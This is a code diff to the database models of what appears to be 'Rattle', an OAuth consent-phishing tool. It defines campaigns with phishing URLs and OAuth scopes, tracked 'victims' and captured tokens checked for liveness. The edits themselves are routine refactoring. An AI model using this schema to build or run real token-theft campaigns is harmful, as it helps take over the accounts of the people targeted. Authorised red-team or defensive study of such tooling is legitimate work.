@@ -1,12 +1,15 @@
 """
 Rattle database models.
 Kept in a separate module so background workers (liveness.py) can import
-them without creating a circular import with app.py.
+them without a circular import with app.py.
 """
 
+import json
 from datetime import datetime, timezone
 
 from flask_sqlalchemy import SQLAlchemy
+from werkzeug.security import check_password_hash, generate_password_hash
+from urllib.parse import urlencode
 
 db = SQLAlchemy()
 
@@ -39,9 +42,6 @@ class User(db.Model):
             return False
 
 
-from werkzeug.security import check_password_hash, generate_password_hash  # noqa: E402
-
-
 class AuditLog(db.Model):
     """Audit trail of admin actions"""
     __tablename__ = "audit_log"
@@ -64,7 +64,7 @@ class Campaign(db.Model):
     status = db.Column(db.String(20), default="active")
     client_id = db.Column(db.String(200), nullable=False)
     client_secret = db.Column(db.String(200), nullable=False)
-    # Bug #2 fix: no hardcoded production domain. Must be filled in per campaign.
+    # Bug #2 fix: no hardcoded domain. Must be filled in per campaign.
     redirect_uri = db.Column(db.String(500), default="")
     scopes = db.Column(
         db.Text,
@@ -76,9 +76,7 @@ class Campaign(db.Model):
     )
     phishing_url = db.Column(db.String(1000))
     created_at = db.Column(db.DateTime, default=utcnow)
-    updated_at = db.Column(
-        db.DateTime, default=utcnow, onupdate=utcnow
-    )
+    updated_at = db.Column(db.DateTime, default=utcnow, onupdate=utcnow)
 
     victims = db.relationship("Victim", backref="campaign", lazy=True)
     tokens = db.relationship("Token", backref="campaign", lazy=True)
@@ -105,7 +103,7 @@ class Victim(db.Model):
 
     id = db.Column(db.Integer, primary_key=True)
     campaign_id = db.Column(db.Integer, db.ForeignKey("campaign.id"), nullable=False)
-    # Per-target tracked link (new feature). Empty for legacy callback captures.
+    # Per-target tracked link (new feature). NULL for legacy callback captures.
     tracking_id = db.Column(db.String(64), unique=True, nullable=True, index=True)
     label = db.Column(db.String(128), default="")
     clicks = db.Column(db.Integer, default=0)
@@ -161,6 +159,8 @@ class Token(db.Model):
             "captured_at": self.captured_at.isoformat() if self.captured_at else None,
             "is_active": self.is_active,
             "status": self.status,
-            "last_checked": self.last_checked.isoformat() if self.last_checked else None,
+            "last_checked": (
+                self.last_checked.isoformat() if self.last_checked else None
+            ),
             "user_info": user_data,
         }
